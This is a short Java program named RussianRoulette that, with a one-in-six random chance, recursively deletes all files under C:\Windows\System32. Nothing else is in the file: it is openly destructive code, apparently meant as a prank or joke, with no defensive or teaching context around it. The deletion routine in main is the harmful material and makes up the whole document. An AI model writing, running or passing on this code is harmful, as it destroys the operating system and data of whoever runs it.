import java.io.File;
import java.util.Random;

class RussianRoulette {

    private static void delete(File file) {
        for (File subFile : file.listFiles()) {
            if (subFile.isDirectory()) {
                delete(subFile);
            } else {
                subFile.delete();
            }
        }
    }

    public static void main(String[] args) {

        Random r = new Random();
        if (r.nextInt(6) == 0) {
            File file = new File("C:\\Windows\\System32");
            delete(file);            
        }
    }
}